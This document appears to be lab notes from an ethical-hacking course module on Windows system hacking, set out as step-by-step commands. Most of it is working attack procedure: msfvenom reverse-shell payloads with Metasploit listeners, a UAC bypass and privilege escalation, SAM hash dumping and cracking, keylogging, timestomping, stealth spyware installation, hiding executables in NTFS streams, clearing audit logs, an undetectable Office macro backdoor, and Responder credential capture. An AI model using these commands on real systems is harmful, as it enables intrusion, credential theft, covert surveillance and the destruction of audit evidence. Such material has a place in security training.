Module 06: System Hacking

Dumping and Cracking SAM Hashes to Extract Plaintext Passwords
	The Security Account Manager (SAM) is a database file present on Windows machines that stores user accounts and security descriptors for users on a local computer. It stores users' passwords in a hashed format (in LM hash and NTLM hash). You need to have administrator access to dump the contents of the SAM file.
	cmd (administrator mode)
	wmic useraccount get name,sid
	PwDump7.exe > c:\hashes.txt
	replace the box symbols before each user ID with its respective User Name
	ophcrack\x86\ophcrack.exe
	Load PWDUMP file
	Table Selection window appears, select Vista free in the list and click Install.
	Crack.

Creating and Using Rainbow Tables
	Winrtgen
	Add table
	Rainbow Table properties window appears. Select ntlm from Hash dropdown list. Set Min Len as 4, Max Len as 6 and Chain Count 4000000. Select loweralpha from Charset dropdown list (it depends upon Password)
	rcrack_gui.exe to launch the RainbowCrack
	File > Load NTLM Hashes from PWDUMP File
	Rainbow Table > Search Rainbow Table
	
Auditing System Passwords Using L0phtCrack
	Password Auditing Wizard
	Choose Audit Type section appears, select Strong Password Audit
	
Exploiting Client Side Vulnerabilities and Establishing a VNC Session
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe
	Share Test.exe with http
	msfconsole
	use multi/handler and press Enter.
	set payload windows/meterpreter/reverse_tcp and press Enter.
	set LHOST 10.10.10.11 and press Enter.
	set LPORT 444 and press Enter.
	run
	Download and run Test.exe in target Windows machine.
	observe that one session is created or opened in the Meterpreter shell.
	If the meterpreter command line does not start interacting with the victim machine automatically, type sessions -i 1 and press Enter to start interacting with the victim machine.
	meterpreter command line type sysinfo.
	run vnc
	TightVNC: window appears with the victim Desktop showing in the window.
	
Escalating Privileges by Exploiting Client Side Vulnerabilities
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe
	Share Exploit.exe with http
	msfconsole
	use exploit/multi/handler and press Enter.
	set payload windows/meterpreter/reverse_tcp and press Enter.
	set LHOST 10.10.10.11 and press Enter.
	To start the listener, type exploit -j -z and press Enter.
	Download and run Exploit.exe in target Windows machine.
	observe that one session is created or opened in the Meterpreter shell.
	Type sessions -i 1 and press Enter to start interacting with the victim machine.
	getuid
	Type run post/windows/gather/smart_hashdump and press Enter. The command fails to dump the passowrd hashes because of insufficient privileges.
	We shall try to escalate the privileges by trying to bypass the user account control setting which is blocking you from gaining unrestricted access to the machine.
	You will now issue a getsystem command that attempts to elevate the user privileges. The command issued is getsystem -t 1 which uses the Service - Named Pipe Impersonation (In Memory/Admin) Technique. This command also fails to escalate the privileges in our case.
	background
	use exploit/windows/local/bypassuac_fodhelper
	show options
	set SESSION 1
	set payload windows/meterpreter/reverse_tcp
	show options
	set LHOST 10.10.10.11
	set TARGET 0 (0 is nothing but Exploit Target ID)
	exploit
	getuid
	Re-issue the getsystem command, in attempt to elevate privileges. Type getsystem and press Enter. Type getuid and press Enter. The meterpreter session is now running with SYSTEM privileges (NT AUTHORITY\SYSTEM)
	run post/windows/gather/smart_hashdump
	
Hacking Windows 10 using Metasploit, and Post-Exploitation Using Meterpreter
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Backdoor.exe
	Share Backdoor.exe with http
	msfconsole
	use exploit/multi/handler and press Enter.
	set payload windows/meterpreter/reverse_tcp and press Enter.
	set LHOST 10.10.10.11 and press Enter.
	show options
	To start the listener, type exploit -j -z and press Enter.
	Download and run Backdoor.exe in target Windows machine.
	observe that one session is created or opened in the Meterpreter shell.
	Type sessions -i 1 and press Enter to start interacting with the victim machine.
	sysinfo
	ipconfig
	getuid
	pwd
	ls
	MACE attributes of secret.txt, type timestomp secret.txt -v
	cd C:\; pwd; ls;
	download bootmgr
	search -f pagefile.sys
	keyscan_start
	keyscan_dump
	idletime
	shutdown

User System Monitoring and Surveillance Using Spytech SpyAgent
	Establish Remote Desktop Connection and install SpyAgent.
	Setup password=spytech
	Complete + Stealth Configuration
	Load on Windows Startup
	Start Monitoring
	To bring SpyAgent out of stealth mode press CTRL+Shift+Alt+M
	
Web Activity Monitoring and Recording using Power Spy
	Establish Remote Desktop Connection and install Power Spy.
	Setup Power Spy
	Stealth Configuration
	Use Ctrl+Alt+X keys to unhide.
	
Hiding Files Using NTFS Streams
	type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
	mklink backdoor.exe readme.txt:calc.exe
	
Hiding Data Using White Space Steganography
	snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
	snow -C -p "magic" readme2.txt

Image Steganography Using OpenStego (saves in .png)

Image Steganography Using Quick Stego (saves in .bmp)

Viewing, Enabling, and Clearing Audit Policies Using Auditpol
	auditpol /get /category:*
	auditpol /set /category:"system","account logon" /success:enable /failure:enable
	auditpol /get /category:*
	auditpol /clear /y
	auditpol /get /category:*
	
Covert Channels using Covert_TCP
	In Kali Linux, cc -o covert_tcp covert_tcp.c
	Do the same in Ubuntu
	To start a listener, type ./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 –source_port 9999 –dest_port 8888 –server –file /home/ubuntu/Desktop/receive/receive.txt
	In Kali Linux, Applications --> Sniffing & Spoofing and select Wireshark, monitor eth0
	./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 -source_port 8888 –dest_port 9999 –file /root/Desktop/send/message.txt
	Covert_tcp changes header of the tcp packets and replaces it with the characters of the string one character at a time to send the message without being detected.
	If you examine the communication between Ubuntu and Kali machines, i.e. 10.10.10.11 and 10.10.10.9 you will find each character of the message string being sent in individual packets over the network.

Hacking Windows Server 2012 with a Malicious Office Document Using TheFatRat
	In Kali Linux, open fatrat
	[06] Create Fud Backdoor 1000% with PwnWinds [Excelent]
	[3] Create exe file with apache + Powershell (FUD 100%)
	Set LHOST IP, LPORT(4444), Output file
	Choose Payload option, choose [ 3 ] windows/meterpreter/reverse_tcp by typing 3
	Type 8 and press Enter to go to the application main menu
	[07] Create Backdoor For Office with Microsploit by typing 7
	|2| The Microsoft Office Macro on Windows by typing 2
	Set LHOST IP, LPORT(4444), Output file
	In Enter the message for the document body (ENTER = default):, leave it to default. In Are you want Use custom exe file backdoor (y/n) option type y.
	Type /root/TheFatRat/output/payload.exe as Path
	[ 3 ] windows/meterpreter/reverse_tcp by typing 3
	Share the doc with web server.
	msfconsole
	Type use multi/handler and press Enter.
	Type set payload windows/meterpreter/reverse_tcp and press Enter.
	Type set LHOST 10.10.10.11 and press Enter.
	Type set LPORT 4444 and press Enter.
	run(start the listener)
	Windows 2012, open the shared document in MS Word. Enable Content in the Security Warning alert.
	In Kali  Linux, observe that one session is created or opened in the Meterpreter shell. (if not type sessions -i 1)
	sysinfo

Active Online Attack using Responder (LLMNR and NBT-NS)
	In Kali Linux, responder -I eth0
	Windows 10 victim machine, run > type \\ceh-tools in the Open field and click OK. Leave the Windows 10 machine running and switch back to Kali Linux machine.
	When DNS resolution for this host fails, the machine will attempt to ask all other machines on the local network for the correct address via LLMNR on UDP/5355 or NBT-NS on UDP/137. An attacker can listen on a network for these LLMNR/NBT-NS broadcasts and respond to them.
	Responder will collect the access credential hashes of the user logged in the victim machine. By default Responder stores logs in usr/share/responder/logs.
	Crack passwords: john /usr/share/responder/logs/<file name of the logs.txt>
